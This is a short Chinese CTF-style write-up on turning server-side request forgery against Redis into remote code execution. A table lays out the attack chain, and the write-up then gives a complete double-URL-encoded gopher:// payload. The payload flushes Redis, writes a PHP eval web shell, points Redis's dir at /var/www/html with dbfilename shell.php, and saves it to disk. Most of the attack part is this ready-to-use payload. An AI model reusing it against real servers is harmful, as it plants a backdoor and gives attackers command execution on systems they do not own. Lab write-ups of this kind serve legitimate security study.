## Redis 协议 RCE

#### 1️⃣ SSRF 与 Redis 结合的核心思路

利用 **SSRF**（Server-Side Request Forgery，服务端请求伪造），让服务器主动去请求攻击者指定的 Redis 服务（或内网未授权的 Redis 服务），并向 Redis 写入恶意 payload，从而进一步实现 **远程命令执行（RCE）**

**2️⃣ SSRF Redis RCE 常见利用链**

| 阶段   | 动作                                                         |
| ------ | ------------------------------------------------------------ |
| 第一步 | SSRF 控制目标服务请求 Redis（通常使用 `gopher://` 协议，可以伪造 TCP payload） |
| 第二步 | 向 Redis 发送写入命令，修改其配置，如 `dir` 和 `dbfilename`  |
| 第三步 | 向 Redis 写入 **恶意 SSH 公钥** 或 **计划任务脚本** 到 Web 根目录或 `.ssh/authorized_keys` |
| 第四步 | 触发 Redis 保存（`SAVE`），将 payload 写入磁盘，造成任意代码执行或提权 |

本题依然可以使用 gopherus 实施攻击

![](https://pic1.imgdb.cn/item/687f797258cb8da5c8cb7bc1.png)

再 URL 编码一次

```
gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

![](https://pic1.imgdb.cn/item/687f78d458cb8da5c8cb6d16.png)
